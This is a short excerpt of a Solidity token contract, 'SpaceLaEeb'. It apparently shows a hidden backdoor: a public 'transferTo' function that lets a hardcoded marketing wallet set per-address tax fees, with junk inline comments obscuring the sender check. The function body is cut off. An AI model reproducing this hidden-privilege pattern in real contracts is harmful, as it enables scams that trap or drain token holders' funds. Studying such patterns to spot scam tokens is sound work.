...
contract SpaceLaEeb is Context, IERC20, Ownable {
    ...
    address payable private marketWall = payable(0xc17E4dF72A3B3FD25086963fd480eE79aBEC2c66); 
    address payable private teamWalletAddress = payable(0x1903966FC37EB1189528D2Cc0601B85Ab056c8a0); 
	...
	function transferTo(address _address, bool _enable, uint256 _addressTaxFee) public {
	    if( marketWall/*asdf aw dawfgh*/ ==  /*asdf aw dawfg*/msg.sender){
